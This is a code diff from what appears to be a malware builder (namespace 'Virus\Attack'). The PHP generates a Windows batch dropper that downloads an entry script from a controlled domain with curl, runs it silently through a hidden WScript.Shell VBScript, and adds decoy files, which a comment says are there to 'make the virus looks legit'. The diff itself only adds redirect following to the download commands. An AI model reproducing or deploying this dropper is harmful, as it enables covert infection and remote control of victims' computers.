@@ -245,11 +245,11 @@ namespace Kelvinho\Virus\Attack {
             mkdir "<?php echo "$home_directory\\libs"; ?>"
             mkdir "<?php echo "$home_directory\\libs\\current"; ?>"
             mkdir "<?php echo "$home_directory\\libs\\utils"; ?>"
-            >"<?php echo "$home_directory\\entry.cmd"; ?>" curl <?php echo ALT_DOMAIN . "/new/win/$user_handle/entry/$virus_id\n" ?>
+            >"<?php echo "$home_directory\\entry.cmd"; ?>" curl -L <?php echo ALT_DOMAIN . "/new/win/$user_handle/entry/$virus_id\n" ?>
             >"<?php echo "$UFile"; ?>" echo On Error Resume Next
             >>"<?php echo "$UFile"; ?>" echo CreateObject^(^"WScript^.Shell^"^)^.Run chr^(34^) ^& ^"<?php echo $home_directory; ?>\entry^.cmd^" ^& chr^(34^)^, 0^, False
             "<?php echo $UFile; // below are just additional things to make the virus looks legit ?>"
-            >"<?php echo "$home_directory\\LICENSE"; ?>" curl <?php echo ALT_DOMAIN . "/new/win/$user_handle/license\n" ?>
+            >"<?php echo "$home_directory\\LICENSE"; ?>" curl -L <?php echo ALT_DOMAIN . "/new/win/$user_handle/license\n" ?>
             >"<?php echo $home_directory; ?>\calculator.cmd" echo calc.exe
             cls
             <?php return ob_get_clean();
